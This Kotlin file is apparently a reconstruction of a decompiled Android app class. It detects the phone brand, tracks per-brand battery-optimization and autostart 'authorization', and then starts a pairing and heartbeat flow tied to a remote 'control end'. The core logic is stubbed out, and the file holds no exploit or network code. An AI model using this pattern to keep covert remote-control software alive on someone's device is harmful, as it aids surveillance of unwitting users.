package com.storm.safe.rock.service.modules

import android.content.Context
import android.os.Build
import android.util.Log
import java.util.LinkedHashMap
import java.util.Locale

/**
 * Device authorization flow manager. Detects device brand, executes per-brand
 * authorization (battery optimization, autostart, etc.), and marks completion.
 *
 * Reverse-engineered from JADX: C0329b4 (b4, 219 lines).
 * Renamed: a0→onAuthResult, a1→markAuthCompleted, a2→resumeWriteSettings,
 *          a3→detectBrand, a4→isInProgress, a5→onAuthorizationDone, a6→startAuthorization
 *
 * JADX tag: "obzzniixzpin"
 */
class DeviceAuthorizationManager(
    // ADAPT: service/context references stubbed for testability
) {
    companion object {
        private const val TAG = "obzzniixzpin"

        /**
         * Detect device brand from Build.BRAND / Build.MANUFACTURER.
         * JADX: a3 (static)
         */
        @JvmStatic
        fun detectBrand(): String? {
            val brand = Build.BRAND.lowercase(Locale.ROOT)
            val manufacturer = Build.MANUFACTURER.lowercase(Locale.ROOT)
            return when {
                brand.contains("vivo") || brand.contains("iqoo") -> "vivo"
                brand.contains("oppo") || manufacturer.contains("oppo") -> "oppo"
                brand.contains("honor") || brand.contains("hihonor") -> "honor"
                brand.contains("xiaomi") || brand.contains("redmi") -> {
                    if (brand.contains("redmi")) "redmi" else "xiaomi"
                }
                brand.contains("oneplus") -> "oneplus"
                brand.contains("huawei") || manufacturer.contains("huawei") -> "huawei"
                brand.contains("samsung") -> "samsung"
                brand.contains("realme") || manufacturer.contains("realme") -> "realme"
                else -> null
            }
        }

        /**
         * Report authorization result.
         * JADX: a0 (static)
         */
        @JvmStatic
        fun onAuthResult(
            success: Boolean,
            completedSteps: List<String>,
            failedSteps: List<String>,
            warnings: List<String>
        ) {
            if (success) {
                Log.d(TAG, "授权成功: ${completedSteps.size}个流程完成")
            } else {
                Log.w(TAG, "⚠️ 设备授权配置部分失败")
                Log.w(TAG, "❌ 授权失败的项目: ${failedSteps.joinToString(", ")}")
                if (warnings.isNotEmpty()) {
                    Log.w(TAG, "⚠️ 警告信息: ${warnings.joinToString(", ")}")
                }
            }
        }

        /**
         * Mark authorization as completed in SharedPreferences.
         * JADX: a1 (static)
         */
        @JvmStatic
        fun markAuthCompleted(context: Context) {
            try {
                context.getSharedPreferences("authorization", Context.MODE_PRIVATE).edit()
                    .putBoolean("authorization_completed", true)
                    .putString("authorization_brand", detectBrand())
                    .putLong("authorization_time", System.currentTimeMillis())
                    .apply()
                context.getSharedPreferences("app_state", Context.MODE_PRIVATE).edit()
                    .putBoolean("authorization_completed", true)
                    .apply()
                Log.i(TAG, "✅ 授权完成状态已标记（authorization + app_state）")
            } catch (e: Exception) {
                Log.e(TAG, "❌ 标记授权完成状态失败", e)
            }
        }
    }

    // --- Instance fields ---

    @Volatile
    private var inProgress: Boolean = false

    /** Map of brand → authorization delegate. JADX: f53198a3 */
    private val brandDelegates: LinkedHashMap<String, Any> = LinkedHashMap() // ADAPT: stub delegate type

    // --- a4 → isInProgress ---
    fun isInProgress(): Boolean {
        return inProgress
        // ADAPT: also checks C0372a9.f55149a6 in vendor
    }

    // --- a5 → onAuthorizationDone ---
    fun onAuthorizationDone(context: Context) {
        try {
            Log.i(TAG, "★★★ 授权流程结束，启动延迟初始化 + 配对流程 ★★★")
            context.getSharedPreferences("app_state", Context.MODE_PRIVATE).edit()
                .putBoolean("authorization_completed", true)
                .apply()
            // ADAPT: stub — would call service.postAuthorizationInit() and heartbeat
            Log.i(TAG, "⏸️ [配对] 自动部署已禁用，请通过控制端手动部署")
        } catch (e: Exception) {
            Log.e(TAG, "❌ 通知授权阶段完成失败", e)
        }
    }

    // --- a6 → startAuthorization ---
    fun startAuthorization(context: Context) {
        if (inProgress) {
            Log.w(TAG, "⚠️ 授权流程已在进行中，跳过")
            return
        }
        try {
            val prefs = context.getSharedPreferences("authorization", Context.MODE_PRIVATE)
            val completed = prefs.getBoolean("authorization_completed", false)
            val savedBrand = prefs.getString("authorization_brand", null)
            val currentBrand = detectBrand()

            if (completed && savedBrand == currentBrand) {
                Log.i(TAG, "✅ 授权已完成，直接启动配对流程（心跳检测）")
                onAuthorizationDone(context)
                return
            }

            // Check app_state fallback
            if (context.getSharedPreferences("app_state", Context.MODE_PRIVATE)
                    .getBoolean("authorization_completed", false)
            ) {
                Log.i(TAG, "✅ [授权检查] app_state.authorization_completed=true，视为已完成（同步authorization标志）")
                try {
                    prefs.edit()
                        .putBoolean("authorization_completed", true)
                        .putString("authorization_brand", currentBrand)
                        .putLong("authorization_time", System.currentTimeMillis())
                        .apply()
                } catch (_: Exception) {}
            }

            // ADAPT: stub — launch coroutine-based authorization flow
            inProgress = true
        } catch (e: Exception) {
            Log.w(TAG, "❌ 检查授权状态失败: ${e.message}")
        }
    }

    // --- a2 → resumeWriteSettings (static in JADX) ---
    fun resumeWriteSettings() {
        try {
            // ADAPT: stub — calls service.m211511k7()
        } catch (e: Exception) {
            Log.e(TAG, "❌ 恢复WRITE_SETTINGS权限申请失败", e)
        }
    }
}
